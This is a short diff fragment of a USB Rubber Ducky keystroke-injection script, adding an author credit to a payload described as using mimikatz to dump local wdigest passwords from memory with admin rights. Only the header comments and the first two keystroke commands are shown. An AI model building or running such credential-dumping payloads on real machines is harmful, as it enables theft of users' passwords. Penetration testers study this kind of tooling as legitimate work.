@@ -1,3 +1,4 @@
+REM Author: hak5darren @ https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---mimikatz-payload
 REM mimikatz ducky script to dump local wdigest passwords from memory using mimikatz (local user needs to be an administrator/have admin privs)
 DELAY 3000
 CONTROL ESCAPE
